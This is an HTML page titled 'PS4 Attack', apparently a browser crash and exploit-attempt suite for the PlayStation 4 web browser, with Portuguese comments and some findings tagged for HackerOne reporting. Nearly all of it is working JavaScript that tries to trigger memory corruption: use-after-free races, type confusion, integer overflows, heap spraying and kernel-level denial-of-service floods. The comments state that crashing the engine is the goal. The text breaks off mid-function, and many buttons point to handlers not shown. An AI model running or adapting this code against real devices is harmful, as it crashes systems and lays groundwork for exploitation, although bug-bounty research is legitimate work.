
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE</h1>

    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>

    <button onclick="runArgumentsCrash()">ALTA REPORTAR Arguments JIT Optimization Crash</button>
    <button onclick="runConcatOOB()">ALTA REPORTAR Array.concat Spreadable Overflow</button>
    <button onclick="runConcatCrash()">ALTA REPORTAR Array.concat Heap Overflow</button>
    <button onclick="runSparseReverse()">ALTA REPORTAR Sparse Array Reverse (Memory Corruption)</button>
    <button onclick="runGCResurrection()">ALTA REPORTAR FinalizationRegistry UAF (GC Panic)</button>
    <button onclick="runImageDataOverflow()">ALTA REPORTAR ImageData Integer Overflow (Crash)</button>

    <button onclick="runReplaceBomb()">MEDIA REPORTAR String.replace Calculation Overflow</button>
    <button onclick="runBadArrayLength()">MEDIA REPORTAR Bad Array Length (Integer Overflow)</button>
    <button onclick="runStringOverflow()">MEDIA REPORTAR String.repeat Integer Overflow</button>	

    <button onclick="runMicrotaskBomb()">BAIXA REPORTAR Promise Microtask Starvation</button>
    <button onclick="run10_AllocPanic()">BAIXA REPORTAR Bad Array New Length</button>

    <button onclick="runBindChain()">STACK OVERFLOW Function.bind() Chain Reaction</button>
    <button onclick="runCollatorRecursion()">STACK OVERFLOW Intl.Collator Infinite Recursion</button>
	
    <button onclick="runLargeArrayOverflow()">SEM MEMORIA Large Array Buffer Overflow</button>


    <button onclick="runConcatCrash()">SEM MEMORIA Array.concat Heap Overflow</button>
    <button onclick="runDOMReentrancy()">TEST 2: DOMNodeRemoved Use-After-Free</button>
    <button onclick="runRegexCrash()">TEST 3: RegExp LastIndex Side-Effect</button>
    <button onclick="runOverlapCopy()">TEST 1: TypedArray Overlap Copy Crash</button>
    
    <button onclick="runSpreadPush()">TEST 2: Array.push Spread Realloc Panic</button>
    
    <button onclick="runLocaleCrash()">TEST 3: Locale Compare Stack Smash</button>
    <button onclick="runRegExpOOB()">TEST 1: RegExp lastIndex Mutation (OOB Read)</button>
    <button onclick="runArrayFromSpecies()">TEST 2: Array.from Species Confusion</button>
    <button onclick="runPortEntangle()">TEST 3: MessagePort Entangle UAF</button>
    <button onclick="runPathChaos()">SEM MEMORIA Path2D Recursive Geometry Crash</button>
    <button onclick="runNetworkRace()">TEST 2: XHR Buffer Detach Race (Heap UAF)</button>
    <button onclick="runKeyframeSmash()">TEST 3: CSS Keyframes List Corruption</button>	
    <button onclick="runURIStackSmash()">TEST 1: URI Decode Stack Smash (mbstowcs)</button>
    <button onclick="runMutexPanic()">TEST 2: Pthread Mutex Destruction Race</button>
    <button onclick="runFloatKiller()">TEST 3: Float Parsing Stack Exhaustion</button>
    <button onclick="runSocketExhaustion()">TEST 1: Socket/FD Exhaustion (Kernel DoS)</button>
    <button onclick="runGamepadSpam()">TEST 2: Gamepad Driver Panic (HID)</button>
    <button onclick="runSensorRace()">TEST 3: Sensor/Geo Service Race</button>
    <button onclick="runTextEncoderUAF()">TEST 1: TextEncoder encodeInto Detach (OOB Write)</button>
    <button onclick="runAnimationCrash()">TEST 2: KeyframeEffect State Confusion</button>
    <button onclick="runStreamRace()">TEST 3: ReadableStream BYOB Race</button>
    <button class="kernel" onclick="runGnmLeak()">TEST 4: GnmDriver Handle Leak (GPU Panic)</button>
    <button class="kernel" onclick="runStackClash()">TEST 5: Thread Stack Clash (Kernel Fault)</button>
        <button onclick="runWeakMapUAF()">TEST 1: WeakMap Ephemeron GC UAF</button>
        <button onclick="runMatchAllCrash()">TEST 2: String.matchAll Iterator Confusion</button>
        <button onclick="runSortSparse()">TEST 3: Array.sort Sparse Bailout Crash</button>
        <button class="kernel" onclick="runBeaconFlood()">TEST 4: sendBeacon IPC Flood (Net Panic)</button>
        <button class="kernel" onclick="runBlobRecursion()">TEST 5: Blob Multipart Stack Smash</button>
        <button onclick="runSerializerSmash()">TEST 1: XMLSerializer Stack Overflow</button>
        <button onclick="runSelectionUAF()">TEST 2: Selection API Use-After-Free</button>
        <button onclick="runPatternRace()">TEST 3: Canvas Pattern Resize Race</button>
        <button class="kernel" onclick="runFDExhaustion()">TEST 4: File Descriptor Flood (System DoS)</button>
        <button class="kernel" onclick="runMutexRace()">TEST 5: Pthread Mutex Destruction Race</button>
        <button onclick="runRangeUAF()">TEST 1: Range.createContextualFragment UAF</button>
        <button onclick="runGradientCrash()">TEST 2: CanvasGradient UAF Race</button>
        <button onclick="runObserverFlood()">SEM MEMORIA MutationObserver Heap Overflow</button>
        <button class="kernel" onclick="runSocketFlood()">TEST 4: WebSocket mbuf Exhaustion (Net Panic)</button>
        <button class="kernel" onclick="runPortChain()">TEST 5: IPC Port Recursion Stack Smash</button>
        <button onclick="runCloneNodeSmash()">TEST 1: Node.cloneNode Deep Recursion</button>
        <button onclick="runHistoryProxyCrash()">TEST 2: History Serializer Proxy Cycle</button>
        <button onclick="runCSSUnitCycle()">TEST 3: CSS calc(em) Unit Cycle</button>
        <button class="kernel" onclick="runConsoleFlood()">TEST 4: Console Log Mutex Flood</button>
        <button class="kernel" onclick="runBlobHandleLeak()">TEST 5: Blob Handle Exhaustion</button>
        <button onclick="runDecoderFrag()">TEST 1: TextDecoder Stream Fragmentation</button>
        <button onclick="runSlotRecursion()">SEM MEMORIA Shadow DOM Slot Stack Smash</button>
        <button onclick="runRegexTypeConf()">TEST 3: RegExp String Type Transition</button>
        <button class="kernel" onclick="runPipeFlood()">MEMORIA DIRETA IPC Pipe Memory Flood</button>
        <button class="kernel" onclick="runThreadStorm()">TEST 5: Pthread Creation/Destruction Storm</button>
        <button onclick="runAudioUAF()">TEST 1: OfflineAudioContext Rendering UAF</button>
        <button onclick="runStreamTeeCrash()">TEST 2: ReadableStream Tee Race</button>
        <button onclick="runFragmentWalker()">TEST 3: DocumentFragment Walker Chaos</button>
        <button class="kernel" onclick="runVMMaps()">MEMORIA DIRETA Kernel VM Map Exhaustion (Page Tables)</button>
        <button class="kernel" onclick="runMbufFlood()">TEST 5: Socket mbuf Deadlock (Network Kill)</button>
        <button onclick="runSplitTextUAF()">TEST 1: Text.splitText Mutation UAF</button>
        <button onclick="runOffscreenRace()">TEST 2: OffscreenCanvas Transfer Race</button>
        <button onclick="runConvolveOverflow()">TEST 3: SVG feConvolveMatrix Overflow</button>
        <button class="kernel" onclick="runSharedWorkerFlood()">KERNEL PANIC: SharedWorker Process Flood</button>
        <button class="kernel" onclick="runTimerFlood()">TEST 5: setInterval Callout Exhaustion</button>
        <button onclick="runCanvasRecursion()">TEST 1: Canvas Pattern Recursion (Infinite Loop)</button>
        <button onclick="runPointerUAF()">TEST 2: Pointer Capture UAF</button>
        <button onclick="runFontExhaustion()">TEST 3: Font Handle Exhaustion</button>
        <button class="kernel" onclick="runVMFragmentation()">TEST 4: Kernel VM Map Fragmentation</button>
        <button class="kernel" onclick="runStackClash()">TEST 5: Worker Stack Clash (Native Stack)</button>
        <button onclick="runTransferSpray()">TEST 1: MessagePort Transfer Heap Spray</button>
        <button onclick="runPadEndOverflow()">MEMORIA DIRETA String.padEnd Integer Overflow</button>
        <button onclick="runLayoutDeep()">TEST 3: CSS Grid/Flex Recursion Crash</button>
        <button class="kernel" onclick="runVMFrag()">TEST 4: Kernel VM Map Fragmentation (Panic Variant)</button>
        <button class="kernel" onclick="runSharedMemFlood()">TEST 5: Shared Memory Handle Exhaustion</button>
	    <button onclick="runGridExplosion()">TEST 1: CSS Grid Implicit Track Explosion</button>
        <button onclick="runIntlRecursion()">TEST 2: Intl.NumberFormat Stack Smash</button>
        <button onclick="runSpliceBlast()">TEST 3: Array.splice Argument Stack Smash</button>
        <button class="kernel" onclick="runIframeFlood()">TEST 4: Iframe Window Handle Flood</button>
        <button class="kernel" onclick="runPortLeak()">TEST 5: MessagePort Kernel Handle Leak</button>
	    <button onclick="runSharedWorkerRace()">TEST 1: SharedWorker Race (Create/Kill Loop)</button>
        <button onclick="runWorkerHeapSpray()">TEST 2: SharedWorker UAF + Heap Spray (0x41414141)</button>
        <button onclick="runGCPressure()">TEST 3: SharedWorker + GC Pressure (Memory Spike)</button>
        <button onclick="runExplosiveCleanup()">TEST 4: SharedWorker Flood + Explicit Destruction</button>
    

	
	
    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>
    
    <div id="hidden-area" style="display:none;"></div>
    <div id="font-area" style="font-family: sans-serif;"></div>
    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
    <div id="sandbox" style="display:none;"></div>
    <div id="ax-root"></div>
    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>

    <script>
        function log(msg) {          
            let logElem = document.getElementById('log');
            logElem.innerText = `> ${msg}\n` + logElem.innerText;
        }
       
        // --- HACKERONE FUNCTIONS ---

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; 
                        
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); 
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando método alternativo (String Repeat)...");
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }

        function runStringAttack() {
            log("Fase 1: Criando Array Fragmentado...");
            setTimeout(() => {
                try {
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); 
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Atenção: O navegador deve travar agora.");

                    var flatString = hugeArray.join("");
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); 
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }

        // --- STACK OVERFLOW ---

        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            try {
                let func = function() { return "pow"; };
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                log("Cadeia criada. Executando (Trigger)...");
                func();
                log("Bind Chain executada (Sem crash).");
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        } 

        function runCollatorRecursion() {
            log("Iniciando Collator Recursion...");
            
            const collator = new Intl.Collator();
            
            const evil = {
                toString: function() {
                    // Recursão infinita dentro da chamada nativa
                    return this.toString(); 
                }
            };

            try {
                log("Comparando objeto recursivo...");
                // O C++ chama toString -> JS chama toString -> ...
                // Se o limite de pilha JS não for verificado dentro do callback do C++, BOOM.
                collator.compare(evil, "a");
                
            } catch(e) {
                log("Erro (Stack Overflow capturado): " + e.message);
            }
        }

        // --- FREEZE FUNCTIONS ---

        function runMicrotaskBomb() {
            log("Iniciando Microtask Starvation (IPC Freeze)...");
            log("Aviso: A aba vai congelar. Observe o comportamento do botão PS.");
            let count = 0;
            function loop() {
                count++;
                Promise.resolve().then(loop);
                if (count % 100000 === 0) {
                    new Date().toString(); 
                }
            }
            loop();
        }

        function runReplaceBomb() {
            log("Armando String.replace Logic Bomb...");
            try {
                let str = "test";
                const re = /.*/; 
                for(let i=0; i<30; i++) { 
                    str = str.replace(re, "$&".repeat(2)); 
                    if (i % 5 === 0) log(`Nível ${i}: Length ~${str.length}`);
                }
                log("String final gerada (Seguro).");
            } catch(e) {
                log("Erro Replace (Provável OOM): " + e.message);
            }
        }

        function runArgumentsCrash() {
            log("Testando Arguments Type Confusion...");
            
            function confuse(arg) {
                // O compilador tenta otimizar o acesso a 'arguments[0]'
                // Nós mudamos a estrutura de 'arguments' deletando índices
                delete arguments[0];
                
                // Agora definimos uma propriedade getter na cadeia de protótipos
                Object.defineProperty(Object.prototype, "0", {
                    get: () => {
                        log("Getter na prototype chain ativado!");
                        // Tenta invalidar a stack frame atual
                        return 0xDEADBEEF;
                    },
                    configurable: true
                });
                
                // O acesso deve ser lento agora, mas se o JIT usou Fast Path, vai ler lixo
                return arguments[0];
            }

            // Treina o motor com chamadas normais
            for(let i=0; i<1000; i++) confuse(1);
            
            log("Executando acesso confuso...");
            const val = confuse(1);
            
            if (val === 0xDEADBEEF) {
                log("Comportamento Correto (Lento).");
            } else if (val === undefined) {
                log("Indefinido (Seguro).");
            } else {
                log(`ALERTA: Valor inesperado lido! ${val} (Possível leitura de Stack lixo)`);
            }
            
            delete Object.prototype["0"]; // Limpeza
        }

        function runConcatOOB() {
            log("Iniciando Array.concat Type Confusion...");
            
            try {
                // Array alvo
                const target = [1.1];
                
                // Objeto malicioso que finge ser um array espalhável
                const proxy = new Proxy({}, {
                    get(target, prop) {
                        if (prop === Symbol.isConcatSpreadable) return true;
                        
                        if (prop === "length") {
                            log("Engine leu length. Retornando tamanho gigante...");
                            // Retorna um tamanho que pode causar overflow se somado ao target
                            // Em 32-bit: 0xFFFFFFFF
                            return 4294967295; 
                        }
                        
                        if (prop === "0") {
                            log("Engine leu índice 0.");
                            return 0x41414141;
                        }
                        
                        return undefined;
                    },
                    has(target, prop) { return true; } // Finge ter todas as propriedades
                });

                log("Executando concat()...");
                
                // O 'concat' tenta alocar um novo array com tamanho = target.length + proxy.length
                // Se houver Integer Overflow, ele aloca pouco.
                // Depois tenta copiar os itens. Se não verificar limites, escreve fora.
                const res = target.concat(proxy);
                
                log("Concat terminou (Sem Crash). Length: " + res.length);
                
            } catch(e) {
                // "Out of memory" ou "Invalid array length" são bons sinais.
                // Crash é o objetivo.
                log("Erro Concat: " + e.message);
            }
        } 

        function runConcatCrash() {
            log("Iniciando Array.concat Overflow...");
            
            try {
                const target = [];
                // Objeto que finge ser um array gigante
                const badSpreadable = {
                    [Symbol.isConcatSpreadable]: true,
                    length: 0xFFFFFFFF, // Tamanho máximo 32-bit
                    0: 1,
                    1: 2
                };

                log("Concatenando array gigante...");
                
                // Se o motor somar target.length (0) + badSpreadable.length (4GB),
                // e ocorrer Integer Overflow, ele pode alocar um buffer pequeno.
                // Mas se o loop de cópia tentar ler até 4GB, crasha.
                const res = target.concat(badSpreadable);
                
                log("Concat finalizado. Length: " + res.length);
                
            } catch(e) {
                log("Erro Concat (Provável OOM): " + e.message);
            }
        }

        function runSparseReverse() {
            log("Iniciando Sparse Array Reverse...");
            
            try {
                const arr = [];
                // Define índices nos extremos do limite de 32-bit
                arr[0] = 1;
                arr[0xFFFFFFFE] = 2; // 4GB - 2
                
                log(`Array esparso criado. Length: ${arr.length}`);
                log("Executando reverse()...");
                
                // O GOLPE: O motor tem de trocar o índice 0 com o 0xFFFFFFFE.
                // Se ele tentar iterar ou alocar memória para os buracos, OOM.
                // Se ele calcular errado o endereço do último item, Crash.
                arr.reverse();
                
                log("Reverse concluído.");
                log("Valor em [0]: " + arr[0]); // Deve ser 2
                
            } catch(e) {
                log("Erro Sparse: " + e.message);
            }
        }

        function runGCResurrection() {
            log("Iniciando GC Resurrection Attack...");
            
            if (!window.FinalizationRegistry) {
                log("API FinalizationRegistry não suportada.");
                return;
            }

            let registry = new FinalizationRegistry(heldValue => {
                // Este código roda quando o objeto morre.
                // O GC está num estado sensível aqui.
                log("Objeto coletado! Tentando alocação massiva no callback...");
                
                // Tenta forçar movimento de memória enquanto o GC limpa
                const chaos = [];
                try {
                    for(let i=0; i<1000; i++) chaos.push(new ArrayBuffer(1024 * 100));
                } catch(e) {}
                
                // Se o GC não estiver bloqueado corretamente, isso pode corromper o heap.
            });

            // Cria objetos descartáveis
            function makeTrash() {
                let obj = { id: Math.random() };
                registry.register(obj, "LIXO");
                obj = null; // Marca para coleta
            }

            // Gera lixo massivo para forçar o ciclo de GC
            log("Gerando pressão de GC...");
            const interval = setInterval(() => {
                for(let i=0; i<1000; i++) makeTrash();
                
                // Tenta forçar alocação para disparar o GC
                const trigger = new Array(10000).fill(1.1);
            }, 10);

            setTimeout(() => {
                clearInterval(interval);
                log("Teste GC finalizado.");
            }, 5000);
        }

        // --- SEM MEMORIA FUNCTIONS ---

	    function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            const sizes = [
                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, -1, 4294967295, 4294967296 
            ];
            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {}
            });
            log("Teste de Array finalizado.");
        }

        function run10_AllocPanic() {
            log("[10] Testing Allocator Panic...");
            try {
                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
                log("Allocated (Unexpected).");
            } catch(e) { log("Alloc Error (Expected): " + e.message); }
        }

        function runImageDataOverflow() {
            log("Iniciando ImageData Math Attack...");
            
            try {
                // Valores críticos para 32-bit (0xFFFFFFFF)
                // 1073741824 * 4 = 0 (Overflow exato)
                // Vamos tentar valores próximos para enganar a validação
                const targets = [
                    { w: 1073741824, h: 1 }, // 4GB exato
                    { w: 32768, h: 32768 },  // 1GB pixels -> 4GB bytes
                    { w: 65536, h: 65536 },  // 4GB pixels -> 16GB bytes (Overflow certo se não checado)
                    { w: 23170, h: 23170 }   // ~2GB bytes
                ];

                targets.forEach((t, i) => {
                    try {
                        log(`Tentativa ${i}: ${t.w} x ${t.h}...`);
                        // O construtor pode lançar IndexSizeError (Seguro)
                        // Se passar e o cálculo estiver errado -> Heap Corruption
                        const img = new ImageData(t.w, t.h);
                        log("ALERTA: ImageData criado! Verifique estabilidade.");
                        
                        // Tenta acessar o buffer (pode crashar se o tamanho for falso)
                        const len = img.data.length;
                        log("Buffer Length reportado: " + len);
                        
                    } catch(e) {
                        // Erro esperado se a proteção funcionar
                    }
                });
                
                log("Teste ImageData finalizado.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        function runStringOverflow() {
            log("Iniciando String.repeat Overflow...");
            
            try {
                // 1. Tenta o limite de 32-bit (4GB)
                // Se o sistema usar 32-bit para comprimento, isso vira 0 ou negativo.
                // "A" (1 byte) * (2^32 - 1)
                // Se o alocador calcular errado, aloca pouco e escreve muito.
                
                // Valores críticos:
                // 0xFFFFFFFF (Max Uint32)
                // 0x7FFFFFFF (Max Int32)
                // 0x20000000 (512MB - limite comum de string no V8/JSC antigo)
                
                const counts = [0x7FFFFFFF, 0xFFFFFFF0, 268435455]; 
                
                counts.forEach(c => {
                    try {
                        log(`Tentando repetir string ${c} vezes...`);
                        const s = "A".repeat(c);
                        log(`String criada (Seguro). Length: ${s.length}`);
                    } catch(e) {
                        // RangeError (Invalid string length) é a proteção.
                        // Se crashar, a proteção falhou.
                        log("Erro (Browser Protegeu): " + e.message);
                    }
                });

                // Tentativa secundária: Overflow com string base maior
                // "AAAA" (4 bytes) * 0x40000000 = 4GB
                const base = "AAAA";
                log("Tentando overflow com base maior...");
                const s2 = base.repeat(0x3FFFFFFF); 
                log("Seguro.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }
		
        function runLargeArrayOverflow() {
            log("Iniciando Allocation Overflow...");
            
            // Valores perigosos para o alocador (que podem virar 0 ou negativo)
            const sizes = [
                0xFFFFFFFF, // Max Uint32
                0x80000000, // Max Int32 + 1
                2147483648, 
                4294967296
            ];

            sizes.forEach(size => {
                try {
                    log(`Tentando alocar: ${size} bytes...`);
                    
                    // Se o motor não validar, e tentar alocar size_t(size),
                    // pode ocorrer wrap-around ou falha catastrófica.
                    const arr = new Uint8Array(size);
                    
                    // Se chegou aqui, algo muito estranho aconteceu.
                    log("ALERTA: Alocação de " + size + " permitida! (Tamanho real: " + arr.length + ")");
                    
                    // Tenta escrever no final para ver se a memória existe
                    arr[size - 1] = 0x41;
                    
                } catch(e) {
                    // Erro esperado (RangeError).
                    // Se crashar (tela azul), é Sucesso.
                }
            });
            log("Teste de Alocação finalizado.");
	}

 function runConcatCrash() {
            log("Iniciando Array.concat Overflow...");
            
            try {
                const target = [];
                // Objeto malicioso que diz ser um array gigante
                const evil = {
                    [Symbol.isConcatSpreadable]: true,
                    // Tamanho crítico: 2^32 - 1. Se somado a algo, pode virar 0 (Overflow)
                    length: 0xFFFFFFFF, 
                    0: 1, 
                    1: 2
                };

                log("Concatenando array virtualmente gigante...");
                
                // Se o motor calcular (0 + 0xFFFFFFFF) e alocar, pode falhar.
                // Se ele tentar copiar os elementos, pode escrever fora do buffer.
                const res = target.concat(evil);
                
                log("Concat sobreviveu. Length: " + res.length);
                
            } catch(e) {
                // Erro de memória (OOM) é um bom sinal. Crash é o objetivo.
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 2: DOMNodeRemoved Use-After-Free ---
        // Ataca o loop de limpeza do DOM.
        function runDOMReentrancy() {
            log("Iniciando DOM UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            
            // Cria estrutura: Pai -> Filho -> Neto
            const parent = document.createElement('div');
            const child = document.createElement('div');
            const grandchild = document.createElement('div');
            
            child.appendChild(grandchild);
            parent.appendChild(child);
            sandbox.appendChild(parent);

            // Adiciona listener que roda quando 'child' é removido
            child.addEventListener('DOMNodeRemoved', function(e) {
                if (e.target === child) {
                    log("Evento disparado! Destruindo estrutura...");
                    // O GOLPE:
                    // O C++ está removendo 'child'. Nós forçamos a remoção de 'parent'
                    // e tentamos aceder a propriedades que dependem da árvore.
                    try {
                        sandbox.innerHTML = ""; // Destrói tudo
                        
                        // Tenta usar o nó órfão
                        const val = child.parentNode; 
                        
                        // Aloca lixo para tentar sobrescrever a memória do 'parent' antigo
                        const junk = new Array(5000).fill(1.1);
                    } catch(x) {}
                }
            });

            log("Limpando pai (Disparando remoção)...");
            // Isso inicia o loop de remoção do C++
            parent.innerHTML = "";
            
            log("DOM UAF teste finalizado.");
        }

        // --- TESTE 3: RegExp LastIndex Side-Effect ---
        // Tenta mudar o estado da regex durante a execução.
        function runRegexCrash() {
            log("Iniciando RegExp Side-Effect...");
            
            try {
                const re = /A/g;
                const str = "A".repeat(1000);
                
                // Define um getter para lastIndex
                // O método exec() lê/escreve lastIndex várias vezes.
                Object.defineProperty(re, 'lastIndex', {
                    get: function() { return 0; },
                    set: function(v) {
                        log("Engine tocou em lastIndex. Corrompendo...");
                        // Tenta invalidar a string de entrada ou a própria regex
                        // (Conceitual: Em JS puro é difícil "free", mas podemos tentar confundir o JIT)
                        
                        // Retorna valor absurdo para tentar OOB read na próxima iteração
                        return 1000000; 
                    }
                });

                log("Executando exec()...");
                re.exec(str);
                
                log("RegExp sobreviveu.");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }


// --- TESTE 1: TypedArray Overlap Copy Crash ---
        // Ataca a lógica de cópia de memória (memmove) com buffers que mudam.
        function runOverlapCopy() {
            log("Iniciando Overlap Copy Attack...");
            
            try {
                // Buffer compartilhado conceitual (simulado via redimensionamento)
                const sab = new ArrayBuffer(1024 * 1024); // 1MB
                const u8 = new Uint8Array(sab);
                
                // Preenche com padrão
                u8.fill(0x41);
                
                // Cria uma view que aponta para o final
                const src = new Uint8Array(sab, 512 * 1024);
                
                log("Preparando cópia com sobreposição...");
                
                // Define um getter no protótipo para tentar interceptar (se o motor checar)
                // ou apenas executa a cópia massiva que força o memmove
                
                // O GOLPE: Copia uma área gigante para dentro dela mesma com offset negativo.
                // u8.set(u8) é seguro. Mas e se o buffer mudar?
                // Vamos tentar redimensionar via Worker Race (conceito anterior) 
                // ou simplesmente estressar o copiador.
                
                // Tentativa de Race Lógica:
                const raceArr = [src];
                Object.defineProperty(raceArr, '0', {
                    get: () => {
                        // Tenta neutrar o buffer original
                        try {
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/js"})));
                            w.postMessage(sab, [sab]);
                            w.terminate();
                            log("Buffer transferido durante a leitura!");
                        } catch(e) {}
                        return src;
                    }
                });
                
                // u8.set aceita um array. Se passarmos o nosso array com getter...
                // (Nota: TypedArray.set geralmente não lê o array input dessa forma, 
                // mas Arrays genéricos sim).
                
                // Abordagem direta: Cópia massiva
                u8.set(u8.subarray(0, 500000), 1);
                
                log("Cópia finalizada (Seguro).");
                
            } catch(e) {
                // Se der erro de "Detached Buffer", a proteção funcionou.
                // Se crashar, falhou.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: Array.push Spread Realloc Panic ---
        // Tenta estourar o alocador (realloc) expandindo argumentos na stack/heap.
        function runSpreadPush() {
            log("Iniciando Spread Push Explosion...");
            
            try {
                const arr = [];
                // Cria um array gigante para espalhar
                // 500.000 elementos
                const huge = new Array(500000).fill(1.1);
                
                log("Tentando push de 500k elementos via spread...");
                
                // O GOLPE: O operador ... (spread) expande os elementos na pilha de argumentos.
                // O método push então tenta alocar espaço para tudo de uma vez.
                // Se o cálculo de novo tamanho falhar ou a stack estourar -> Crash.
                arr.push(...huge);
                
                log("Push completado. Length: " + arr.length);
                
                // Tenta de novo para forçar realloc num buffer já grande
                log("Tentando segundo push (Realloc Stress)...");
                arr.push(...huge);
                
                log("Sobreviveu. Length: " + arr.length);
                
            } catch(e) {
                // RangeError: Maximum call stack size exceeded é comum (Safe).
                // Crash é o objetivo.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Locale Compare Stack Smash ---
        // Tenta estourar a stack nativa da libc usando strcoll.
        function runLocaleCrash() {
            log("Iniciando Locale Stack Smash...");
            
            try {
                // Strings gigantes
                const s1 = "A".repeat(1024 * 1024); // 1MB
                const s2 = "B".repeat(1024 * 1024);
                
                log("Comparando strings de 1MB com locale complexo...");
                
                // Usa um locale que requer transformação complexa (ex: Húngaro ou Vietnamita)
                // Isso força a libc a alocar buffers de transformação.
                const res = s1.localeCompare(s2, "hu", { usage: "sort", sensitivity: "variant" });
                
                log("Comparação segura. Resultado: " + res);
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

 // --- TESTE 1: RegExp lastIndex Mutation (OOB Read) ---
        // Tenta encolher a string alvo enquanto a Regex a está lendo.
        function runRegExpOOB() {
            log("Iniciando RegExp OOB Attack...");
            
            try {
                // String grande
                let str = "A".repeat(100000);
                // Regex global para usar lastIndex
                const re = /A/g;
                
                // Define um getter malicioso para lastIndex
                Object.defineProperty(re, 'lastIndex', {
                    get: function() {
                        // O C++ chama isso antes de continuar a busca.
                        // O GOLPE: Alteramos a string 'str' para ser minúscula.
                        // O ponteiro antigo do C++ ainda aponta para a memória grande?
                        log("Getter ativado! Encolhendo string...");
                        str = "A"; // Reduz drasticamente o tamanho
                        
                        // Tenta encher a memória libertada com lixo
                        const filler = new Array(10000).fill(1.1);
                        
                        return 0; // Retorna índice válido
                    }
                });

                log("Executando exec()...");
                // Se o motor não validar o tamanho da string novamente após ler lastIndex,
                // ele vai ler memória fora da nova string 'str'.
                re.exec(str);
                
                log("RegExp terminou (Seguro).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: Array.from Species Confusion ---
        // Usa Symbol.species para enganar o construtor sobre onde escrever os dados.
        function runArrayFromSpecies() {
            log("Iniciando Array Species Attack...");
            
            try {
                // Array fonte
                const source = [1, 2, 3, 4, 5];
                
                // Construtor falso que retorna um array menor que o solicitado
                const FakeArray = function(len) {
                    log(`Engine pediu array de tamanho ${len}. Retornando tamanho 0...`);
                    return new Array(0); // Retorna array vazio
                };
                
                // Define a "espécie" do array
                Object.defineProperty(Array, Symbol.species, {
                    value: FakeArray
                });

                // O GOLPE: Array.from usa a espécie para criar o destino.
                // Se o loop de cópia confiar no tamanho da fonte (5) e não no destino (0),
                // ele escreve 5 itens num buffer de 0.
                log("Executando Array.from...");
                
                // Nota: Usamos uma classe derivada para ativar o caminho do species
                class SubArray extends Array {}
                const res = SubArray.from(source);
                
                log("Operação concluída.");
                
            } catch(e) {
                log("Erro: " + e.message);
            } finally {
                // Limpeza (importante para não quebrar o resto da página)
                Object.defineProperty(Array, Symbol.species, { value: Array });
            }
        }

        // --- TESTE 3: MessagePort Entangle UAF ---
        // Cria um ciclo de portas e tenta quebrar a cadeia de referência.
        function runPortEntangle() {
            log("Iniciando Port Entangle UAF...");
            
            try {
                const channel1 = new MessageChannel();
                const channel2 = new MessageChannel();
                
                // Worker para segurar as pontas
                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>e.data.postMessage('pong')"], {type:"text/js"})));
                
                log("Emaranhando portas...");
                
                // Envia porta 2 pelo canal 1
                channel1.port1.postMessage("entangle", [channel2.port1]);
                
                // O GOLPE: Tenta fechar a porta 1 (que enviou) e a porta 2 (que foi enviada)
                // numa ordem que confunda o Garbage Collector de IPC.
                
                // Fecha o canal de transporte
                channel1.port1.close();
                
                // Tenta enviar dados pela porta que foi transferida (mas ainda temos referência?)
                // Em JS puro a referência é perdida, mas podemos tentar race com close()
                channel2.port2.close();
                
                // Força GC
                const junk = [];
                for(let i=0; i<5000; i++) junk.push(new ArrayBuffer(1024));
                
                log("Entangle teste finalizado (Se não crashou, sistema é robusto).");
                w.terminate();
                
            } catch(e) {
                log("Erro Port: " + e.message);
            }
        }

function runPathChaos() {
            log("Iniciando Path2D Chaos...");
            
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            try {
                const path = new Path2D();
                
                // 1. Injeta valores tóxicos (NaN/Infinity) na geometria
                // Isso tenta quebrar o cálculo de 'Tessellation' (divisão em triângulos)
